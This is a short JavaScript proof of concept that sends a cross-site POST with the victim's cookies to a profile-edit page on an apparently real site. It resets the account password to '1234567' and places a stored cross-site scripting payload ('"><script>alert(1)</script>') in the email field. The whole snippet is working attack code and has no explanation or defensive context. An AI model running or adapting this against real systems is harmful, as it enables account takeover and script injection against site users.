const formData = new FormData();
formData.append("input_pw", "1234567");
formData.append("input_pw2", "1234567");
formData.append("input_name", "정순호");
formData.append("input_mail", "\"><script>alert(1)</script>");

fetch("http://jmseok.com/web/my/mypageedit_proc.php", {
    method: "POST",
    body: formData,
    credentials: "include"
});
